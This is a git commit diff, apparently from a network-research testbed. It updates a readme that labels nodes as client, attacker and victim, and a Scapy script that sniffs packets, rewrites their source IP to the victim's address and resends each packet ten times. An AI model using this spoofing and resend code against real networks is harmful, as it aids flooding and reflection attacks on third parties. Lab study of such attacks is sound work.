30352a466e9d585a41bcdaf45327b3014870ea36
rukshani <rukshani@node-1.quicflood.rotornet-pg0.wisc.cloudlab.us>
2022-05-26 21:22:35 -0500

    Change IP

--- readme.md
+++ readme.md
@@ -1,4 +1,6 @@
-node 0 - 10.10.1.1
-node 1 - 10.10.1.5
-node 2 - 10.10.1.3
+node 0 - 10.10.1.1 (client)
+node 1 - 10.10.1.5 (attacker) (Spoof ip)
+node 2 - 10.10.1.3 (victim)
 
+node 1 -> node 0 
+Some packets ended up in node 2
--- snif.py
+++ snif.py
@@ -9,15 +9,18 @@ def print_pkt(pkt):
     print("Protocol:", pkt[IP].proto)
     print("\n")
 
-    a = IP(src="10.10.1.3", dst="10.10.1.1") 
-    b = UDP() 
-    data = pkt[UDP].payload 
-    newpkt = a/b/data
+    # a = IP(src="10.10.1.3", dst="10.10.1.1") 
+    pkt[IP].src = "10.10.1.3"
+    del pkt[IP].chksum
+    # b = UDP() 
+    # data = pkt[UDP].payload 
+    # newpkt = a/b/data
 
-    print("Spoofed Packet………") 
-    print("Source IP : ", newpkt[IP].src) 
-    print("Destination IP :", newpkt[IP].dst) 
-    send(newpkt)
+    # print("Spoofed Packet………") 
+    # print("Source IP : ", newpkt[IP].src) 
+    # print("Destination IP :", newpkt[IP].dst) 
+    for i in range(10):
+        send(pkt)
 
 
 pkt = sniff(filter='ip src host 10.10.1.5', prn=print_pkt)
